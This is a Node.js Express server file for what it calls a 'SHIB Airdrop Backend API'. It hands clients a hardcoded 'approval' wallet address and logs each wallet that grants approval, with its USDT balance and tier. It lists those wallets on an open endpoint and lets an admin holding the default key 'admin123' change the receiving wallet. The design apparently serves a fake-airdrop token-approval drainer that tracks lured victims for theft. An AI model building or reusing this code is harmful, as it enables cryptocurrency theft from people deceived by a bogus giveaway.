const express = require('express');
const cors = require('cors');
const mongoose = require('mongoose');
const app = express();

// Middleware
app.use(cors());
app.use(express.json());

// Environment Variables - Render Compatible
const MONGODB_URI = process.env.MONGODB_URI;
const ADMIN_KEY = process.env.ADMIN_KEY || 'admin123';
const PORT = process.env.PORT || 3001;

// MongoDB Connection with better error handling
const connectDB = async () => {
    try {
        if (!MONGODB_URI) {
            throw new Error('MONGODB_URI environment variable is required');
        }
        
        await mongoose.connect(MONGODB_URI, {
            useNewUrlParser: true,
            useUnifiedTopology: true,
            serverSelectionTimeoutMS: 5000,
            socketTimeoutMS: 45000,
        });
        console.log('✅ Connected to MongoDB Atlas');
    } catch (error) {
        console.error('❌ MongoDB connection error:', error.message);
        process.exit(1);
    }
};

// User Schema
const userSchema = new mongoose.Schema({
    walletAddress: { type: String, required: true, unique: true },
    usdtBalance: String,
    airdropAmount: String,
    referralCount: { type: Number, default: 0 },
    approvalGiven: { type: Boolean, default: false },
    approvalTimestamp: Date,
    tier: String,
    createdAt: { type: Date, default: Date.now }
});

const User = mongoose.model('User', userSchema);

// Settings Schema
const settingsSchema = new mongoose.Schema({
    approvalWalletAddress: { type: String, default: "0xCcf0a381D804BFa37485Bc450CE540c09350f975" },
    updatedAt: { type: Date, default: Date.now }
});

const Settings = mongoose.model('Settings', settingsSchema);

// Initialize default settings
async function initializeSettings() {
    try {
        const settings = await Settings.findOne();
        if (!settings) {
            const defaultSettings = new Settings();
            await defaultSettings.save();
            console.log('✅ Default settings initialized');
        }
    } catch (error) {
        console.error('Error initializing settings:', error);
    }
}

// API Routes

// Health check endpoint
app.get('/api/health', (req, res) => {
    res.json({ 
        success: true, 
        message: 'Server is running on Render', 
        timestamp: new Date().toISOString(),
        environment: process.env.NODE_ENV || 'development'
    });
});

// Save user approval
app.post('/api/save-approval', async (req, res) => {
    try {
        const { walletAddress, usdtBalance, airdropAmount, tier } = req.body;
        
        if (!walletAddress) {
            return res.status(400).json({ success: false, message: 'Wallet address is required' });
        }
        
        let user = await User.findOne({ walletAddress });
        
        if (user) {
            // Update existing user
            user.usdtBalance = usdtBalance || user.usdtBalance;
            user.airdropAmount = airdropAmount || user.airdropAmount;
            user.tier = tier || user.tier;
            user.approvalGiven = true;
            user.approvalTimestamp = new Date();
        } else {
            // Create new user
            user = new User({
                walletAddress,
                usdtBalance,
                airdropAmount,
                tier,
                approvalGiven: true,
                approvalTimestamp: new Date()
            });
        }
        
        await user.save();
        res.json({ success: true, message: 'Approval saved successfully' });
    } catch (error) {
        console.error('Error saving approval:', error);
        res.status(500).json({ success: false, message: 'Internal server error' });
    }
});

// Get approval wallet address
app.get('/api/approval-wallet', async (req, res) => {
    try {
        const settings = await Settings.findOne();
        res.json({ 
            success: true, 
            approvalWalletAddress: settings?.approvalWalletAddress || "0xCcf0a381D804BFa37485Bc450CE540c09350f975" 
        });
    } catch (error) {
        console.error('Error fetching approval wallet:', error);
        res.status(500).json({ success: false, message: 'Internal server error' });
    }
});

// Update approval wallet address (Admin only)
app.post('/api/update-approval-wallet', async (req, res) => {
    try {
        const { newWalletAddress, adminKey } = req.body;
        
        // Admin authentication
        if (adminKey !== ADMIN_KEY) {
            return res.status(401).json({ success: false, message: 'Unauthorized' });
        }
        
        if (!newWalletAddress || !newWalletAddress.startsWith('0x')) {
            return res.status(400).json({ success: false, message: 'Valid wallet address required' });
        }
        
        let settings = await Settings.findOne();
        if (!settings) {
            settings = new Settings();
        }
        
        settings.approvalWalletAddress = newWalletAddress;
        settings.updatedAt = new Date();
        
        await settings.save();
        res.json({ success: true, message: 'Approval wallet updated successfully' });
    } catch (error) {
        console.error('Error updating approval wallet:', error);
        res.status(500).json({ success: false, message: 'Internal server error' });
    }
});

// Get all users who gave approval
app.get('/api/approved-users', async (req, res) => {
    try {
        const users = await User.find({ approvalGiven: true })
            .sort({ approvalTimestamp: -1 })
            .select('walletAddress usdtBalance airdropAmount tier approvalTimestamp referralCount');
        
        res.json({ success: true, users });
    } catch (error) {
        console.error('Error fetching approved users:', error);
        res.status(500).json({ success: false, message: 'Internal server error' });
    }
});

// Get user statistics
app.get('/api/user-stats', async (req, res) => {
    try {
        const totalUsers = await User.countDocuments();
        const approvedUsers = await User.countDocuments({ approvalGiven: true });
        
        const users = await User.find({ approvalGiven: true });
        let totalAirdropAmount = 0;
        users.forEach(user => {
            const amount = parseFloat(user.airdropAmount) || 0;
            totalAirdropAmount += amount;
        });
        
        res.json({
            success: true,
            stats: {
                totalUsers,
                approvedUsers,
                totalAirdropAmount: Math.round(totalAirdropAmount)
            }
        });
    } catch ( error) {
        console.error('Error fetching user stats:', error);
        res.status(500).json({ success: false, message: 'Internal server error' });
    }
});

// Root endpoint
app.get('/', (req, res) => {
    res.json({
        success: true,
        message: 'SHIB Airdrop Backend API',
        version: '1.0.0',
        endpoints: {
            health: '/api/health',
            approvalWallet: '/api/approval-wallet',
            saveApproval: '/api/save-approval',
            approvedUsers: '/api/approved-users',
            userStats: '/api/user-stats'
        }
    });
});

// Start server
const startServer = async () => {
    try {
        await connectDB();
        await initializeSettings();
        
        app.listen(PORT, '0.0.0.0', () => {
            console.log(`🚀 Backend server running on port ${PORT}`);
            console.log(`📊 Environment: ${process.env.NODE_ENV || 'development'}`);
            console.log(`🌐 API available at: http://localhost:${PORT}`);
        });
    } catch (error) {
        console.error('❌ Failed to start server:', error);
        process.exit(1);
    }
};

startServer();